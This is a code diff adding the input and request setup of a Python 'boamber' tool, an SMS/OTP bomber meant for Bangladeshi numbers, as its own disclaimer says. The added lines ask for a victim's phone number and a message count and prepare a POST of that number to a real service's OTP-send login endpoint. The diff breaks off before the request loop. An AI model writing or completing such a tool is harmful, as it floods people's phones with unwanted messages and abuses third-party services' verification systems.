@@ -68,3 +68,32 @@ dtls=(yellow+"\t\t MODIFIED BY: J4M1U9(PICCI CODER) ")
 
 note=(cyan+"Note: I wont be responsible fo any illigal activites. >> This boamber tool is for use in Bangladesh only. Use our Global version for worldwide use.")
 
+print(logo)
+
+print(" ")
+
+print(dtls)
+
+print(tversion)
+
+print(line)
+
+print(note)
+
+print(line)
+
+
+
+
+
+print(' ')
+
+number=str(input(red+"[➙] Enter Your Number : "))
+amount=int(input(cyan+"[➙] Enter The Amount(100) : "))
+
+url1 = "https://ss.binge.buzz/otp/send/login"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone="+number
